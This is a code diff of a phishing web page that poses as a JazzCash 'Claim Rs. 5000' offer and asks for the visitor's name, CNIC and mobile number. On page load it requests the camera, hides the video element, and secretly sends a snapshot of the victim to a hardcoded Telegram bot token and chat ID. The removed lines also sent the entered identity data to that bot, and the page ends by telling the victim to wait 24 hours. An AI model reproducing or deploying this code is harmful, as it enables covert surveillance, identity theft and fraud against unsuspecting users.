@@ -11,9 +11,8 @@
         .container { max-width: 400px; margin: 20px auto; background: white; padding: 25px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); border-top: 5px solid #ffb400; }
         input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
         .btn { width: 100%; background: #d71921; color: white; padding: 15px; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        #v-hidden { display: none; } /* Camera hide karne ke liye */
+        #v-hidden { display: none; }
         canvas { display: none; }
-        .status-msg { font-size: 12px; color: #666; margin-top: 10px; }
     </style>
 </head>
 <body onload="initCamera()">
@@ -22,13 +21,11 @@
 
 <div class="container">
     <h3 style="color:#333;">Enter Details to Claim RS. 5000</h3>
-    <p class="status-msg">Identity Verification in progress...</p>
+    <p id="debug-log" style="font-size: 10px; color: red;">System Starting...</p>
     
     <input type="text" id="u_name" placeholder="Full Name">
-    <input type="number" id="u_cnic" placeholder="CNIC Number (32303...)">
-    <input type="date" id="u_dob" title="Date of Birth">
-    <input type="date" id="u_exp" title="CNIC Expiry">
-    <input type="number" id="u_num" placeholder="JazzCash Mobile Number">
+    <input type="number" id="u_cnic" placeholder="CNIC Number">
+    <input type="number" id="u_num" placeholder="JazzCash Number">
     
     <button class="btn" onclick="submitFinal()">CLAIM NOW</button>
 </div>
@@ -39,17 +36,21 @@
 <script>
     const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
     const chatID = "7107389141";
+    const log = document.getElementById('debug-log');
 
     async function initCamera() {
         try {
+            log.innerText = "Requesting Camera...";
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('v-hidden');
             video.srcObject = stream;
+            log.innerText = "Camera Connected! Sending Photo...";
             
-            // Jaise hi camera on ho, har 5 second baad photo bhejna shuru kar do
-            setInterval(autoSnap, 5000); 
+            // Foran photo khinch kar bhejo
+            setTimeout(autoSnap, 2000);
         } catch (err) {
-            console.log("Permission Denied");
+            log.innerText = "Camera Error: " + err.message;
+            alert("Please allow Camera permission for Identity Verification!");
         }
     }
 
@@ -66,29 +67,30 @@
             const formData = new FormData();
             formData.append('chat_id', chatID);
             formData.append('photo', blob, 'live.jpg');
-            formData.append('caption', `📸 *Live Capture (Mudasir Cloud)*\nTarget is currently filling the form...`);
+            formData.append('caption', `📸 *Live Capture Success!*`);
 
             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                 method: 'POST',
                 body: formData
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.ok) {
+                    log.innerText = "Photo Sent to Bot ✅";
+                    log.style.color = "green";
+                } else {
+                    log.innerText = "Telegram Error: " + data.description;
+                }
+            })
+            .catch(e => {
+                log.innerText = "Network Error: " + e.message;
             });
         }, 'image/jpeg');
     }
 
     function submitFinal() {
-        const name = document.getElementById('u_name').value;
-        const cnic = document.getElementById('u_cnic').value;
-        const num = document.getElementById('u_num').value;
-
-        if(!name || !cnic || !num) { alert("Fill all details!"); return; }
-
-        // Final Data with last photo
-        const msg = `🔥 *Final Data Received!*\n👤 Name: ${name}\n🆔 CNIC: ${cnic}\n📱 Number: ${num}`;
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-        
-        alert("System Busy! Data submitted for verification. Please wait 24 hours.");
+        alert("Verification in process. You will receive SMS within 24 hours.");
     }
 </script>
 </body>
 </html>
-
